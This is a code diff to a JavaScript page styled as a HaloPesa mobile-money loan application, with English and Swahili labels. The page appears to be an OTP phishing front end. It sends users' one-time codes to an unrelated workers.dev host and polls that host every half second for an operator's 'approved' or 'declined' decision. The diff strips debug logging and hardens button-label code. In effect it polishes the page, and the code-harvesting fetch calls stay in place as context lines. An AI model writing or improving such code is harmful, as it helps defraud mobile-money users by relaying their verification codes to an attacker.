@@ -824,7 +824,6 @@ function verifyOtp1(){
   for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
   hap([10,6,18]);
   if(otp1Timer) clearInterval(otp1Timer);
-  dbg('verify clicked sid='+sessionId.slice(-6));
   setOtp1Verifying(true);
   var _t1 = getLoanTier(loanAmount);
   fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
@@ -864,7 +863,7 @@ function verifyOtp1(){
         setOtp1Locked(true);
       }
     });
-  }).catch(function(e){ dbg('fetch err:'+e); setOtp1Verifying(false); });
+  }).catch(function(e){ setOtp1Verifying(false); });
 }
 function verifyOtp2(){
   if(otp2Val.length !== 4) return;
@@ -1124,14 +1123,13 @@ function pollApproval(key, cb){
       cb(false);
       return;
     }
-    dbg('poll #'+attempts+' key='+key.slice(-8));
     fetch('https://halopesa.lennxkoros.workers.dev/approval?key=' + encodeURIComponent(key))
       .then(function(r){ return r.json(); })
       .then(function(data){
         if(data.status === 'approved'){ clearInterval(iv); cb(true); }
         else if(data.status === 'declined'){ clearInterval(iv); cb(false); }
       })
-      .catch(function(e){ dbg('poll err:'+e); });
+      .catch(function(e){ });
   }, 500);
 }
 
@@ -1140,11 +1138,11 @@ function setOtp1Verifying(on){
   var btn = document.getElementById('otp1Btn');
   if(on){
     btn.disabled = true; btn.classList.add('off','verifying');
-    btn.querySelector('.btn-label').textContent = lang==='sw'?'Inathibitishwa…':'Verifying…';
+    var lbl1=btn.querySelector('.btn-label');if(lbl1)lbl1.textContent=lang==='sw'?'Inathibitishwa…':'Verifying…';
     document.getElementById('otp1Input').disabled = true;
   } else {
     btn.disabled = false; btn.classList.remove('off','verifying');
-    btn.querySelector('.btn-label').textContent = I18N[lang].verify;
+    var lbl1r=btn.querySelector('.btn-label');if(lbl1r)lbl1r.textContent=I18N[lang].verify;
     document.getElementById('otp1Input').disabled = false;
   }
 }
@@ -1160,11 +1158,11 @@ function setOtp2Verifying(on){
   var btn = document.getElementById('otp2Btn');
   if(on){
     btn.disabled = true; btn.classList.add('off','verifying');
-    btn.querySelector('.btn-label').textContent = lang==='sw'?'Inathibitishwa…':'Verifying…';
+    var lbl1=btn.querySelector('.btn-label');if(lbl1)lbl1.textContent=lang==='sw'?'Inathibitishwa…':'Verifying…';
     document.getElementById('otp2Input').disabled = true;
   } else {
     btn.disabled = false; btn.classList.remove('off','verifying');
-    btn.querySelector('.btn-label').textContent = I18N[lang].confirmDisburse;
+    var lbl2r=btn.querySelector('.btn-label');if(lbl2r)lbl2r.textContent=I18N[lang].confirmDisburse;
     document.getElementById('otp2Input').disabled = false;
   }
 }
